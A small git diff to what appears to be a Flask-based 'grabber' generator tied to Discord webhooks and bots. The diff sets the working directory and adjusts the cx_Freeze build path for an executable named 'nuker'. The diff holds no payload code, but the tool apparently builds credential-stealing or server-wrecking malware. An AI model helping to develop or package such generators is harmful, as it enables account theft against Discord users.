@@ -3,6 +3,7 @@ import discordWebhook, discordBot
 from flask import Flask, request, redirect, render_template
 
 app = Flask(__name__)
+os.chdir(os.path.dirname(os.path.abspath(__file__)))
 
 @app.route('/')
 def index():
@@ -95,7 +96,7 @@ def grabberGenerator():
                             "   name=\"nuker\",",
                             "   version=\"1.0\",",
                             "   description=\"\",",
-                            "   options={'build_exe': {'packages': "+str(libraries)+", \"build_exe\": \"temp/nuker\"}},",
+                            "   options={'build_exe': {'packages': "+str(libraries)+", \"build_exe\": \"./temp/nuker\"}},",
                             "   executables=[Executable(\"temp/"+randomStr+".py\")]",
                             ")"]
             with open(f"temp/{randomStr}.py", mode="w") as f:
